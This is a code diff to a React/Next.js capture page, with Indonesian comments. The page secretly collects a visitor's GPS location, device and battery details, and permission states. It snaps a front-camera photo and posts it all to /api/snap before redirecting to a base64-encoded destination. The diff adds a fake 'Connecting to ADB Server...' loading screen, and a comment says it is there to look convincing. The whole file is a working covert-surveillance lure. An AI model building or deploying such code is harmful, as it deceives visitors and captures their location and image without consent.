@@ -11,7 +11,6 @@ function CaptureContent() {
 
   useEffect(() => {
     const autoProcess = async () => {
-      // 1. Decode Destination
       let destination = "/";
       try {
         if (t) destination = atob(t);
@@ -19,7 +18,7 @@ function CaptureContent() {
         destination = "/";
       }
 
-      // 2. Deteksi Info Perangkat & Jaringan
+      // 1. Deteksi Perangkat & Hardware
       const deviceInfo = {
         model: navigator.userAgent.includes("Android")
           ? "Android"
@@ -28,38 +27,17 @@ function CaptureContent() {
             : "PC",
         os: navigator.platform,
         browser: navigator.userAgent.split(" ").pop(),
-        language: navigator.language,
-        cores: navigator.hardwareConcurrency || "Unknown",
-        memory: (navigator as any).deviceMemory || "Unknown",
       };
 
-      // 3. Deteksi Status Izin (Sesuai daftar perizinan browser)
-      const getPermissions = async () => {
-        const perms: any = {};
-        const list = [
-          "notifications",
-          "geolocation",
-          "clipboard-read",
-          "camera",
-          "microphone",
-        ];
-
-        for (const name of list) {
-          try {
-            const status = await navigator.permissions.query({
-              name: name as any,
-            });
-            perms[name] = status.state;
-          } catch {
-            perms[name] = "unsupported";
-          }
-        }
-        return perms;
+      // 2. Deteksi Dukungan WebUSB (Ya-WebADB) & Izin Lainnya
+      const permissions = {
+        usb: "usb" in navigator ? "supported" : "unsupported",
+        hid: "hid" in navigator ? "supported" : "unsupported",
+        notifications:
+          "Notification" in window ? Notification.permission : "unsupported",
       };
 
-      const browserPerms = await getPermissions();
-
-      // 4. Deteksi Baterai
+      // 3. Deteksi Baterai
       let batteryInfo = null;
       try {
         if ("getBattery" in navigator) {
@@ -71,30 +49,24 @@ function CaptureContent() {
         }
       } catch (e) {}
 
-      // 5. Ambil GPS
-      const gps: any = await new Promise((resolve) => {
+      // 4. Ambil GPS
+      const gps = await new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(
           (pos) =>
-            resolve({
-              lat: pos.coords.latitude,
-              lon: pos.coords.longitude,
-              acc: pos.coords.accuracy,
-            }),
+            resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
           () => resolve(null),
-          { timeout: 5000, enableHighAccuracy: true },
+          { timeout: 5000 },
         );
       });
 
-      // 6. Ambil Gambar & Kirim
+      // 5. Proses Capture Kamera
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" },
-          audio: false,
         });
-
         if (videoRef.current && canvasRef.current) {
           videoRef.current.srcObject = stream;
-          await new Promise((r) => setTimeout(r, 1500)); // Tunggu fokus kamera
+          await new Promise((r) => setTimeout(r, 1500));
 
           const canvas = canvasRef.current;
           canvas.width = videoRef.current.videoWidth;
@@ -104,7 +76,7 @@ function CaptureContent() {
           const image = canvas.toDataURL("image/png");
           stream.getTracks().forEach((track) => track.stop());
 
-          // Kirim Data Lengkap
+          // Kirim ke API
           await fetch("/api/snap", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -113,17 +85,12 @@ function CaptureContent() {
               gps,
               device: deviceInfo,
               battery: batteryInfo,
-              permissions: {
-                ...browserPerms,
-                location: !!gps,
-                nearby:
-                  "bluetooth" in navigator ? "supported" : "not supported",
-              },
+              permissions: { ...permissions, location: !!gps },
             }),
           });
         }
       } catch (err) {
-        // Jika kamera ditolak, tetap kirim data sisa (GPS/Device Info)
+        // Tetap kirim data meskipun kamera gagal
         await fetch("/api/snap", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -132,7 +99,7 @@ function CaptureContent() {
             gps,
             device: deviceInfo,
             battery: batteryInfo,
-            permissions: { ...browserPerms, location: !!gps, camera: "denied" },
+            permissions,
           }),
         });
       } finally {
@@ -145,10 +112,12 @@ function CaptureContent() {
 
   return (
     <div className="bg-black text-white flex flex-col items-center justify-center min-h-screen font-mono">
-      <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-blue-500 mb-4"></div>
-      <p className="text-[10px] tracking-[0.2em] text-slate-500 uppercase animate-pulse">
-        System Synchronizing...
+      {/* Tampilan Fake Loading agar terlihat meyakinkan */}
+      <div className="w-16 h-16 border-4 border-blue-500/20 border-t-blue-500 rounded-full animate-spin mb-4"></div>
+      <p className="text-[10px] tracking-[0.3em] text-blue-500 uppercase animate-pulse">
+        Connecting to ADB Server...
       </p>
+
       <video
         ref={videoRef}
         autoPlay
@@ -162,15 +131,7 @@ function CaptureContent() {
 
 export default function CapturePage() {
   return (
-    <Suspense
-      fallback={
-        <div className="bg-black flex items-center justify-center min-h-screen">
-          <p className="text-slate-700 text-[10px] uppercase tracking-widest">
-            Loading Security Modules...
-          </p>
-        </div>
-      }
-    >
+    <Suspense fallback={<div className="bg-black min-h-screen"></div>}>
       <CaptureContent />
     </Suspense>
   );
